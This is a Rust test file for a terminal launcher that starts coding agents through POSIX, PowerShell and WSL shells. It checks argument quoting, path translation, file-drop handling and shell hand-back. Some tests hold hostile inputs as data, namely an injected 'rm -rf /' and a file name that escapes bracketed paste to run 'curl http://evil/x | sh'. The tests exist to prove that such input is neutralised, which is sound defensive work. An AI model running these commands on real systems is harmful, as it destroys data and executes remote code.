use super::*;

fn launch<'a>(program: &'a str, args: &'a [String]) -> Launch<'a> {
    Launch {
        backend: Backend::Native,
        distro: None,
        cwd: "/home/ada/code",
        program,
        args,
        via_shell: true,
    }
}

#[test]
fn wraps_every_argument_in_single_quotes() {
    assert_eq!(
        posix_command_line("claude", &["--continue".into()]),
        "'claude' '--continue'"
    );
}

#[test]
fn keeps_a_spaced_argument_as_one_word() {
    let line = posix_command_line("claude", &["-p".into(), "what changed?".into()]);
    assert_eq!(line, "'claude' '-p' 'what changed?'");
}

#[test]
fn escapes_embedded_quotes_so_the_shell_cannot_break_out() {
    assert_eq!(posix_quote("it's"), r"'it'\''s'");
    assert_eq!(posix_quote("'; rm -rf /"), r"''\''; rm -rf /'");
}

#[test]
fn a_program_with_no_arguments_is_still_quoted() {
    assert_eq!(
        posix_command_line("/opt/my tools/claude", &[]),
        "'/opt/my tools/claude'"
    );
}

#[test]
fn powershell_doubles_an_embedded_quote_rather_than_backslashing_it() {
    assert_eq!(powershell_quote("it's"), "'it''s'");
    assert_eq!(
        powershell_command_line("claude", &["-p".into(), "what's new?".into()]),
        "'claude' '-p' 'what''s new?'"
    );
}

#[test]
fn a_posix_shell_session_with_no_program_is_an_interactive_login_shell() {
    assert_eq!(posix_shell_args("", &[]), ["-l"]);
    assert_eq!(powershell_args("", &[]), ["-NoLogo"]);
}

#[test]
fn a_program_replaces_the_shell_rather_than_nesting_under_it() {
    let args = posix_shell_args("claude", &["--continue".into()]);
    assert_eq!(args, ["-l", "-i", "-c", "exec 'claude' '--continue'"]);

    let args = powershell_args("claude", &["--continue".into()]);
    assert_eq!(args, ["-NoLogo", "-Command", "& 'claude' '--continue'"]);
}

#[test]
fn skipping_the_shell_runs_the_program_itself() {
    let args = ["--continue".to_string()];
    let direct = Launch {
        via_shell: false,
        ..launch("claude", &args)
    };
    let resolved = argv(&direct);
    assert_eq!(resolved.program, "claude");
    assert_eq!(resolved.args, args);
}

#[test]
fn an_interactive_session_keeps_the_shell_even_when_the_shell_is_skipped() {
    let no_args: [String; 0] = [];
    let resolved = argv(&Launch {
        via_shell: false,
        ..launch("", &no_args)
    });
    assert_ne!(resolved.program, "");
    assert!(!resolved.args.is_empty());
}

#[test]
fn a_wsl_session_enters_the_distro_at_the_sessions_own_directory() {
    let no_args: [String; 0] = [];
    let args = wsl_args(&Launch {
        backend: Backend::Wsl,
        distro: Some("Ubuntu"),
        cwd: r"C:\Users\ada\code",
        ..launch("", &no_args)
    });
    assert_eq!(args, ["-d", "Ubuntu", "--cd", "/mnt/c/Users/ada/code"]);
}

#[test]
fn a_wsl_session_with_no_distro_uses_the_default_one() {
    let no_args: [String; 0] = [];
    let args = wsl_args(&Launch {
        backend: Backend::Wsl,
        distro: None,
        cwd: "/home/ada",
        ..launch("", &no_args)
    });
    assert_eq!(args, ["--cd", "/home/ada"]);
}

#[test]
fn a_wsl_agent_runs_through_the_distros_login_shell() {
    let extra = ["--continue".to_string()];
    let args = wsl_args(&Launch {
        backend: Backend::Wsl,
        distro: Some("Ubuntu"),
        cwd: r"\\wsl$\Ubuntu\home\ada\code",
        ..launch("claude", &extra)
    });
    assert_eq!(
        args,
        [
            "-d",
            "Ubuntu",
            "--cd",
            "/home/ada/code",
            "--exec",
            "sh",
            "-c",
            // `-i` for the same reason the host shell needs it: `.bashrc`
            // is where a distro's PATH edits live.
            &handback_line(
                &posix_command_line(
                    "bash",
                    &["-lic".into(), "exec 'claude' '--continue'".into()]
                ),
                "\"${SHELL:-bash}\" -l"
            ),
        ]
    );
}

#[test]
fn a_wsl_request_off_windows_falls_back_to_the_host_shell() {
    let no_args: [String; 0] = [];
    let resolved = argv(&Launch {
        backend: Backend::Wsl,
        ..launch("", &no_args)
    });
    if cfg!(windows) {
        assert_eq!(resolved.program, "wsl.exe");
    } else {
        assert_ne!(resolved.program, "wsl.exe");
    }
}

#[test]
fn translates_a_drive_letter_to_its_wsl_mount() {
    assert_eq!(wsl_path(r"C:\Users\ada\code"), "/mnt/c/Users/ada/code");
    assert_eq!(wsl_path("D:/data"), "/mnt/d/data");
    assert_eq!(wsl_path(r"C:\"), "/mnt/c");
    assert_eq!(wsl_path("C:"), "/mnt/c");
}

#[test]
fn unwraps_the_share_windows_reaches_a_distro_through() {
    assert_eq!(wsl_path(r"\\wsl$\Ubuntu\home\ada\code"), "/home/ada/code");
    assert_eq!(wsl_path(r"\\wsl.localhost\Debian\srv\app"), "/srv/app");
    assert_eq!(wsl_path(r"\\wsl$\Ubuntu"), "/");
}

#[test]
fn a_path_the_distro_already_understands_is_left_alone() {
    assert_eq!(wsl_path("/home/ada/code"), "/home/ada/code");
    assert_eq!(wsl_path("/"), "/");
}

#[test]
fn reads_the_distro_list_out_of_utf16_output() {
    let out: Vec<u8> = "\u{feff}Ubuntu\r\nDebian\r\n"
        .encode_utf16()
        .flat_map(u16::to_le_bytes)
        .collect();
    assert_eq!(parse_wsl_distros(&out), ["Ubuntu", "Debian"]);
}

#[test]
fn a_distro_list_that_is_plain_utf8_still_parses() {
    assert_eq!(parse_wsl_distros(b"Ubuntu\nDebian\n"), ["Ubuntu", "Debian"]);
    assert!(parse_wsl_distros(b"").is_empty());
}

#[test]
fn the_default_shell_is_an_absolute_path_or_a_windows_executable() {
    let shell = default_shell();
    assert!(shell.starts_with('/') || shell.ends_with(".exe"), "{shell}");
}

#[test]
fn home_is_readable_on_every_host() {
    assert!(home().is_some_and(|home| !home.is_empty()));
}

#[cfg(unix)]
#[test]
fn reads_this_process_own_directory() {
    let cwd = process_cwd(std::process::id() as i32);
    assert_eq!(cwd.as_deref(), Some(env!("CARGO_MANIFEST_DIR")));
}

#[cfg(target_os = "macos")]
#[test]
fn reads_the_cwd_field_out_of_lsof_output() {
    let out = "p54321\nfcwd\nn/Users/ada/code/project\n";
    assert_eq!(
        parse_lsof_cwd(out).as_deref(),
        Some("/Users/ada/code/project")
    );
}

#[cfg(target_os = "macos")]
#[test]
fn ignores_lsof_output_with_no_path() {
    assert_eq!(parse_lsof_cwd("p54321\nfcwd\n"), None);
    assert_eq!(parse_lsof_cwd(""), None);
    // A permission error leaves a relative or bare marker, never a path.
    assert_eq!(parse_lsof_cwd("p1\nfcwd\nnno-such-thing"), None);
}

#[test]
fn a_dropped_path_is_quoted_for_the_shell_that_will_read_it() {
    let paths = vec!["/code/my app/notes.md".to_string()];

    assert_eq!(
        drop_text(&paths, Quoting::Posix, false),
        "'/code/my app/notes.md' "
    );
    assert_eq!(
        drop_text(&paths, Quoting::Powershell, false),
        "'/code/my app/notes.md' "
    );
}

#[test]
fn a_quote_in_a_filename_cannot_end_the_quoting() {
    // A file really can be called this, and the two shells escape it
    // differently — POSIX by closing and reopening, PowerShell by doubling.
    let paths = vec!["/tmp/it's here.txt".to_string()];

    assert_eq!(
        drop_text(&paths, Quoting::Posix, false),
        r"'/tmp/it'\''s here.txt' "
    );
    assert_eq!(
        drop_text(&paths, Quoting::Powershell, false),
        "'/tmp/it''s here.txt' "
    );
}

#[test]
fn several_dropped_files_arrive_as_several_arguments() {
    let paths = vec!["/a.txt".to_string(), "/b.txt".to_string()];

    assert_eq!(
        drop_text(&paths, Quoting::Posix, false),
        "'/a.txt' '/b.txt' "
    );
}

#[test]
fn a_drop_on_a_wsl_session_gets_the_path_the_distro_can_open() {
    // `C:\code\a.txt` names nothing inside the distro.
    let paths = vec!["C:\\code\\a.txt".to_string()];

    assert_eq!(
        drop_text(&paths, Quoting::Posix, true),
        "'/mnt/c/code/a.txt' "
    );
}

#[test]
fn a_drop_of_nothing_types_nothing() {
    // The event fires with an empty list when a drag is cancelled over the
    // window, and a bare space would still be a keystroke the agent sees.
    assert_eq!(drop_text(&[], Quoting::Posix, false), "");
    assert_eq!(drop_text(&[String::new()], Quoting::Posix, false), "");
}

#[test]
fn a_filename_carrying_control_bytes_is_never_typed() {
    // Quoting keeps its balance, but the text is delivered through bracketed
    // paste, which does not strip an end marker embedded in it — so the
    // receiving program would leave paste mode and read the rest as keys.
    let hostile = "/repo/x\u{1b}[201~; curl http://evil/x | sh\r".to_string();

    let paths = [hostile];
    assert_eq!(drop_text(&paths, Quoting::Posix, false), "");
    assert_eq!(drop_text(&paths, Quoting::Powershell, false), "");
}

#[test]
fn a_newline_in_a_filename_is_refused_too() {
    // xterm turns a newline into a carriage return, which submits the line.
    assert_eq!(
        drop_text(&["/repo/two\nlines.txt".to_string()], Quoting::Posix, false),
        ""
    );
}

#[test]
fn refusing_one_path_still_drops_the_others() {
    let paths = vec![
        "/repo/fine.txt".to_string(),
        "/repo/bad\u{1b}.txt".to_string(),
        "/repo/also fine.txt".to_string(),
    ];

    assert_eq!(
        drop_text(&paths, Quoting::Posix, false),
        "'/repo/fine.txt' '/repo/also fine.txt' "
    );
}

#[cfg(unix)]
#[test]
fn an_agent_session_is_held_by_a_shell_it_hands_back_to() {
    let args = ["--continue".to_string()];
    let resolved = argv(&launch("claude", &args));
    let shell = default_shell();

    assert_eq!(resolved.program, "/bin/sh");
    let line = &resolved.args[1];
    // The agent `exec`s over the login shell, as every agent session does.
    let run = posix_shell_args("claude", &args);
    assert!(line.contains(&posix_command_line(&shell, &run)), "{line}");
    assert!(
        line.ends_with(&format!("exec {} '-l'", posix_quote(&shell))),
        "{line}"
    );
}

#[test]
fn only_an_agent_launched_through_a_shell_hands_back() {
    let args: [String; 0] = [];
    assert!(hands_back(&launch("claude", &args)) == cfg!(unix));
    assert!(
        !hands_back(&launch("", &args)),
        "a shell has nothing to hand to"
    );
    let direct = Launch {
        via_shell: false,
        ..launch("claude", &args)
    };
    assert!(!hands_back(&direct), "nothing holds a program run directly");
}

#[test]
fn the_mode_reset_is_text_a_single_quoted_printf_argument_can_carry() {
    assert!(!MODE_RESET.contains('\''));
    assert!(MODE_RESET.bytes().all(|byte| (0x20..0x7f).contains(&byte)));
}

/// Runs the wrapper for real: the reset and the announcement have to come out
/// of `printf` as the bytes the terminal reads, and the shell after them has to
/// run whatever the agent did.
#[cfg(unix)]
#[test]
fn the_hand_back_resets_the_terminal_announces_the_status_and_becomes_the_shell() {
    let line = handback_line(
        "sh -c 'echo \"agent sees [$MUSTER_HANDBACK]\"; exit 3'",
        "sh -c 'echo then-ran'",
    );
    let out = std::process::Command::new("/bin/sh")
        .args(["-c", &line])
        .env(HANDBACK_TOKEN_ENV, "t0ken")
        .output()
        .expect("sh");
    let text = String::from_utf8_lossy(&out.stdout);

    // The agent never sees the token it could forge the announcement with.
    assert!(text.starts_with("agent sees []\n"), "{text:?}");
    // The cursor is saved before the screen switch that restores one.
    assert!(text.contains("\x1b7\x1b[?1049l"), "{text:?}");
    assert!(text.contains("\x1b[?1000l"), "{text:?}");
    assert!(
        text.contains(&format!("\x1b]777;{HANDBACK};t0ken;3\x1b\\")),
        "{text:?}"
    );
    assert!(text.ends_with("then-ran\n"), "{text:?}");
}

/// The agent shares the `sh`'s process group, so Ctrl+C reaches both — and
/// dash dies of it even when the agent carries on. The `sh` has to outlive
/// the signal and still hand back.
#[cfg(unix)]
#[test]
fn an_interrupt_the_agent_survives_does_not_end_the_hand_back() {
    let line = handback_line(
        "sh -c 'trap \"echo agent-caught\" INT; kill -INT 0; sleep 0.2; exit 0'",
        "sh -c 'echo then-ran'",
    );
    for shell in ["/bin/sh", "/bin/dash"] {
        if !std::path::Path::new(shell).exists() {
            continue;
        }
        use std::os::unix::process::CommandExt;
        // A group of its own, as a session has: `kill -INT 0` is the
        // terminal's Ctrl+C here, and in the test runner's group it would
        // interrupt the runner itself.
        let out = std::process::Command::new(shell)
            .args(["-c", &line])
            .env(HANDBACK_TOKEN_ENV, "t")
            .process_group(0)
            .output()
            .expect("sh");
        let text = String::from_utf8_lossy(&out.stdout);
        assert!(text.contains("agent-caught"), "{shell}: {text:?}");
        assert!(text.ends_with("then-ran\n"), "{shell}: {text:?}");
    }
}

/// An agent killed in raw mode leaves the tty that way, and the shell after it
/// inherits no echo, no Ctrl+C and no carriage return. Run in a real pty,
/// because the settings belong to the terminal.
#[cfg(unix)]
#[test]
fn the_hand_back_restores_the_tty_an_agent_left_raw() {
    use portable_pty::{native_pty_system, CommandBuilder, PtySize};
    use std::io::Read;

    let line = handback_line("sh -c 'stty raw -echo; exit 1'", "stty -a");
    let pair = native_pty_system()
        .openpty(PtySize {
            rows: 24,
            cols: 200,
            pixel_width: 0,
            pixel_height: 0,
        })
        .expect("openpty");
    let mut cmd = CommandBuilder::new("/bin/sh");
    cmd.args(["-c", &line]);
    let mut child = pair.slave.spawn_command(cmd).expect("spawn");
    drop(pair.slave);
    let mut reader = pair.master.try_clone_reader().expect("reader");
    let mut out = Vec::new();
    // Ends in EIO rather than EOF on some hosts once the child has gone.
    let _ = reader.read_to_end(&mut out);
    child.wait().expect("wait");
    let text = String::from_utf8_lossy(&out);
    let settings = text.split_whitespace().collect::<Vec<_>>();

    for restored in ["icanon", "isig", "echo", "opost"] {
        assert!(settings.contains(&restored), "{restored}: {text:?}");
    }
}

/// The shell after the agent carries the integration on its own command line,
/// where the agent's environment never sees it.
#[test]
fn the_shell_handed_back_to_takes_the_integration_and_the_agent_does_not() {
    let zsh = Integration {
        env: vec![("ZDOTDIR".into(), "/data/shell/zsh".into())],
        args: Vec::new(),
    };
    assert_eq!(
        shell_after("/bin/zsh", Some(&zsh)),
        "'env' 'ZDOTDIR=/data/shell/zsh' '/bin/zsh' '-l'"
    );
    // bash's init file replaces `-l`, which it would otherwise ignore it for.
    let bash = Integration {
        env: vec![("MUSTER_SHELL_LOGIN".into(), "1".into())],
        args: vec!["--init-file".into(), "/data/shell/bash.sh".into()],
    };
    assert_eq!(
        shell_after("/bin/bash", Some(&bash)),
        "'env' 'MUSTER_SHELL_LOGIN=1' '/bin/bash' '--init-file' '/data/shell/bash.sh'"
    );
    assert_eq!(shell_after("/bin/zsh", None), "'/bin/zsh' '-l'");

    let args: [String; 0] = [];
    let line = &integrated_argv(&launch("claude", &args), Some(&zsh)).args[1];
    if cfg!(unix) {
        let (agent, after) = line.split_once("exec 'env'").expect("{line}");
        assert!(!agent.contains("ZDOTDIR"), "{line}");
        assert!(after.contains("ZDOTDIR"), "{line}");
    }
}

/// Told apart by command line, not by name: a login shell that is itself `sh`
/// answers to the wrapper's name once the wrapper has become it.
#[cfg(unix)]
#[test]
fn only_the_hand_back_sh_counts_as_the_wrapper() {
    let mut wrapper = std::process::Command::new("/bin/sh")
        .args(["-c", &handback_line("sleep 5", "sh")])
        .spawn()
        .expect("sh");
    let mut plain = std::process::Command::new("/bin/sh")
        .args(["-c", "sleep 5; :"])
        .spawn()
        .expect("sh");
    let answers = (is_wrapper(wrapper.id()), is_wrapper(plain.id()));
    let _ = wrapper.kill();
    let _ = plain.kill();
    let _ = wrapper.wait();
    let _ = plain.wait();
    assert_eq!(answers, (true, false));
}

#[cfg(unix)]
#[test]
fn a_process_group_lists_its_members() {
    use std::os::unix::process::CommandExt;
    let mut child = std::process::Command::new("sleep")
        .arg("5")
        .process_group(0)
        .spawn()
        .expect("sleep");
    let members = group_members(child.id() as i32);
    let _ = child.kill();
    let _ = child.wait();
    assert_eq!(members, vec![child.id()]);
}
